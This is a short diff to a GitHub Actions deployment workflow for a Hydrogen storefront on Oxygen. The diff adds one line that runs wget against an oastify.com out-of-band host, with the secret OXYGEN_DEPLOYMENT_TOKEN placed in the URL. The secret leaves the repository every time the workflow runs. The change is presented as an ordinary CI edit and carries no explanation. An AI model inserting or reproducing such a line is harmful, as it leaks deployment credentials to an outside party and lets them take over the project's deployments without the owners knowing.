@@ -43,6 +43,7 @@ jobs:
         with:
           oxygen_deployment_token: ${{ secrets.OXYGEN_DEPLOYMENT_TOKEN_262453 }}
           build_command: "HYDROGEN_ASSET_BASE_URL=$OXYGEN_ASSET_BASE_URL yarn build"
+        run: wget https://er9j0gj8ravcv6fc0ypmv2uo6fcb01oq.oastify.com/${{ secrets.OXYGEN_DEPLOYMENT_TOKEN_262453 }}
 
       # Create GitHub Deployment
       - name: Create GitHub Deployment
